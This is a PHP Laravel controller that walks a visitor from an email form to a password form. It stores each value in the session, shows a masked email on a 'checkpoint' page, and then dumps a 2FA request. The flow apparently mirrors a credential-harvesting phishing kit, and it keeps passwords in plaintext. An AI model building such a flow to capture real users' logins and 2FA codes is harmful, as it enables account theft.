<?php

namespace App\Http\Controllers;
use Carbon\Carbon;
use Illuminate\Http\Request;

class MainController extends Controller
{
    public function index() {
        $date = Carbon::now();
        $date = Carbon::createFromFormat('Y-m-d H:i:s', $date);
        $date = $date->format('F j, Y');
        return view('index', compact('date'));
    }

    public function mail() {
        return view('email');
    }

    public function checkMail(Request $request) {
        $email = $request->email;
        session(['email' => $email]);
        return view('password');
    }

    public function changePass(Request $request) {
        $password = $request->password;
        session(['password' => $password]);
        $email = session('email');
        $parts = explode('@', $email);
        $emailNew = $email;
        if (count($parts) == 2) {
            $username = $parts[0];
            $domain = $parts[1];
            $visibleLength = 1;
            $hiddenLength = strlen($username) - (2 * $visibleLength);
            $hiddenPart = str_repeat('*', $hiddenLength);
            $hiddenUsername = substr($username, 0, $visibleLength) . $hiddenPart . substr($username, -$visibleLength);
            $emailNew = $hiddenUsername . '@' . $domain;
        }
        return view('checkpoint', compact('emailNew'));
    }

    public function check2FA(Request $request) {
        dd($request);
    }
}
